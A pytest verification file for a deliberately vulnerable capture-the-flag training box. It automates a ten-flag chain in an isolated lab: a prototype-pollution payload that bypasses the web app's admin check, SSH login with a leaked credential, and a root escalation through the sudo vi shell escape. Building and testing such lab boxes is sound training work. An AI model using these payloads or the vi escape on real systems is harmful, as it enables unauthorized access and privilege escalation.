"""Phase 13 verification: domainzero-beginner-helpdesk -- the Beginner
tier of "Domain Zero Directory". A real, dependency-free Node.js app
(boxes-src/domainzero-beginner-helpdesk/docker/app.js) with a genuine
prototype-pollution auth bypass: a naive recursive `for...in` merge
with no __proto__/constructor/prototype key filtering, the same bug
class as several real npm-package CVEs. Verified by actually exploiting
it (not just reading the source): before the payload, GET /api/whoami
reports isAdmin:false from a brand-new plain object every time; after
POSTing {"__proto__":{"isAdmin":true}} to the vulnerable merge
endpoint, every subsequent fresh {} object -- including ones the app
itself creates with no code path that ever sets isAdmin -- reports
isAdmin:true, because Object.prototype itself was polluted.

Plain single-host box, no backend-specific dependency, works on both
Docker and Kubernetes. 10 real flags, climbing difficulty: web recon
(flags 1-3) -> confirming the vulnerable merge endpoint is reachable
(flag 4) -> the actual prototype-pollution payload, proven via a
process-wide side effect (flag 5) -> the now-unlocked admin endpoint,
leaking a second credential (flag 6) -> SSH foothold via that
credential (flag 7) -> a sudo/GTFOBins ('vi') privesc hint (flag 8) ->
a root-only file read via the GTFOBins escape (flag 9) -> a full root
shell via the same escape (flag 10).

Real HTTP, real exploitation of a real (if deliberately introduced)
JS vulnerability, real SSH, a real privilege escalation -- no mocks.
Requires the box image already built
(ctf-boxes/domainzero-beginner-helpdesk:latest), `sshpass` on PATH, and
a running orchestrator reachable at ORCHESTRATOR_TEST_URL.
"""
import hashlib
import hmac
import os
import secrets as pysecrets
import subprocess

import pytest
import requests

BASE_URL = os.environ.get("ORCHESTRATOR_TEST_URL", "http://127.0.0.1:9100")
BOX_ID = "domainzero-beginner-helpdesk"
_TEAM_ID_BASE = pysecrets.randbelow(1_000_000)

OPS_PASSWORD = "Triage-Escalate-99!"  # fixed/narrative -- leaked via the auth-bypassed admin endpoint


def expected_flag(secret: str, n: int) -> str:
    digest = hmac.new(secret.encode(), f"{BOX_ID}:{n}".encode(), hashlib.sha256).hexdigest()
    return f"HLC{{{digest[:10]}}}"


def _port(inst: dict, container_port: int) -> int:
    for p in inst["ports"]:
        if p["container_port"] == container_port:
            return p["host_port"]
    raise AssertionError(f"no port {container_port} in instance ports: {inst['ports']}")


def _ssh(host: str, port: int, command: str, timeout: float = 20.0):
    return subprocess.run(
        [
            "sshpass", "-p", OPS_PASSWORD, "ssh",
            "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null", "-o", "ConnectTimeout=10",
            "-p", str(port), f"ops-triage@{host}", command,
        ],
        capture_output=True, text=True, timeout=timeout,
    )


def _escalate_via_vi(host: str, port: int, shell_command: str) -> str:
    """The box's one intended privesc: ops-triage has passwordless sudo
    on /usr/bin/vi -- the GTFOBins Ex-mode ('-es') shell escape, run as
    root, with no interactive full-screen editor session to wrangle."""
    result = _ssh(
        host, port,
        f"sudo vi -es -c '!{shell_command}' -c 'q!' /etc/hostname",
    )
    assert result.returncode == 0, f"GTFOBins escalation failed: {result.stderr}"
    return result.stdout


@pytest.fixture(params=["docker", "kubernetes"])
def box_instance(request):
    backend = request.param
    team_id = _TEAM_ID_BASE + (1 if backend == "docker" else 2)
    secret = pysecrets.token_hex(32)
    r = requests.post(
        f"{BASE_URL}/instances",
        json={"team_id": team_id, "box_id": BOX_ID, "team_secret": secret, "backend": backend},
    )
    r.raise_for_status()
    inst = r.json()
    try:
        yield inst, secret, backend
    finally:
        resp = requests.delete(f"{BASE_URL}/instances/{inst['instance_id']}")
        if not resp.ok:
            raise AssertionError(f"teardown failed to destroy instance: {resp.status_code} {resp.text}")


def test_full_ten_flag_chain(box_instance):
    inst, secret, backend = box_instance
    host = inst["entry_host"]
    web_port, ssh_port = _port(inst, 5000), _port(inst, 22)
    base = f"http://{host}:{web_port}"

    # Flags 1-3: plain web recon.
    landing = requests.get(f"{base}/", timeout=10).text
    assert expected_flag(secret, 1) in landing
    ticket = requests.get(f"{base}/tickets/1", timeout=10).text
    assert expected_flag(secret, 2) in ticket
    changelog = requests.get(f"{base}/CHANGELOG.md", timeout=10).text
    assert expected_flag(secret, 3) in changelog

    # Confirm the vulnerability genuinely isn't exploited yet.
    whoami_before = requests.get(f"{base}/api/whoami", timeout=10).json()
    assert whoami_before["isAdmin"] is False
    assert "flag5" not in whoami_before

    # Flag 4: the vulnerable merge endpoint is reachable with an
    # ordinary nested-object payload (no exploit attempt yet).
    reach = requests.post(f"{base}/api/profile", json={"theme": {"color": "blue"}}, timeout=10).json()
    assert expected_flag(secret, 4) in reach["flag4"]

    # Flag 5: the real prototype-pollution payload, proven by a
    # process-wide side effect on a FRESH object the app creates itself
    # with no code path that ever sets isAdmin directly.
    requests.post(f"{base}/api/profile", json={"__proto__": {"isAdmin": True}}, timeout=10)
    whoami_after = requests.get(f"{base}/api/whoami", timeout=10).json()
    assert whoami_after["isAdmin"] is True
    assert expected_flag(secret, 5) in whoami_after["flag5"]

    # Flag 6: the now-unlocked admin endpoint, leaking a second credential.
    admin = requests.get(f"{base}/api/admin/users", timeout=10).json()
    assert expected_flag(secret, 6) in admin["flag6"]
    assert OPS_PASSWORD in str(admin["users"])

    # Flag 7: SSH foothold via that leaked credential.
    user_txt = _ssh(host, ssh_port, "cat user.txt")
    assert user_txt.returncode == 0, user_txt.stderr
    assert expected_flag(secret, 7) in user_txt.stdout

    # Flag 8: a hint file pointing at the sudo/GTFOBins privesc.
    notes = _ssh(host, ssh_port, "cat notes.txt")
    assert expected_flag(secret, 8) in notes.stdout
    sudo_l = _ssh(host, ssh_port, "sudo -l")
    assert "/usr/bin/vi" in sudo_l.stdout

    # Flag 9: a root-only file, read via the GTFOBins escape before going for a full shell.
    log_output = _escalate_via_vi(host, ssh_port, "cat /var/log/helpdesk-admin.log")
    assert expected_flag(secret, 9) in log_output

    # Flag 10: full root shell via the same escape.
    root_output = _escalate_via_vi(host, ssh_port, "cat /root/root.txt")
    assert expected_flag(secret, 10) in root_output


def test_idempotent_create(box_instance):
    inst, secret, backend = box_instance
    r = requests.post(
        f"{BASE_URL}/instances",
        json={
            "team_id": inst["team_id"], "box_id": BOX_ID, "team_secret": "a-different-secret-must-be-ignored",
            "backend": backend,
        },
    )
    r.raise_for_status()
    assert r.json()["instance_id"] == inst["instance_id"]


def test_cross_team_flag_isolation(box_instance):
    inst, secret, backend = box_instance
    team_id_b = inst["team_id"] + 1000
    secret_b = pysecrets.token_hex(32)
    r = requests.post(
        f"{BASE_URL}/instances",
        json={"team_id": team_id_b, "box_id": BOX_ID, "team_secret": secret_b, "backend": backend},
    )
    r.raise_for_status()
    inst_b = r.json()
    try:
        host_a, port_a = inst["entry_host"], _port(inst, 5000)
        host_b, port_b = inst_b["entry_host"], _port(inst_b, 5000)
        landing_a = requests.get(f"http://{host_a}:{port_a}/", timeout=10).text
        landing_b = requests.get(f"http://{host_b}:{port_b}/", timeout=10).text
        assert expected_flag(secret, 1) in landing_a
        assert expected_flag(secret_b, 1) in landing_b
        assert expected_flag(secret, 1) != expected_flag(secret_b, 1)
        assert expected_flag(secret, 1) not in landing_b

        # Prototype pollution is process-wide WITHIN one instance's own
        # Node process -- confirm it does NOT leak across TEAMS (each
        # team's instance is a wholly separate container/process).
        requests.post(f"http://{host_a}:{port_a}/api/profile", json={"__proto__": {"isAdmin": True}}, timeout=10)
        whoami_b = requests.get(f"http://{host_b}:{port_b}/api/whoami", timeout=10).json()
        assert whoami_b["isAdmin"] is False
    finally:
        resp = requests.delete(f"{BASE_URL}/instances/{inst_b['instance_id']}")
        if not resp.ok:
            raise AssertionError(f"teardown failed to destroy instance: {resp.status_code} {resp.text}")
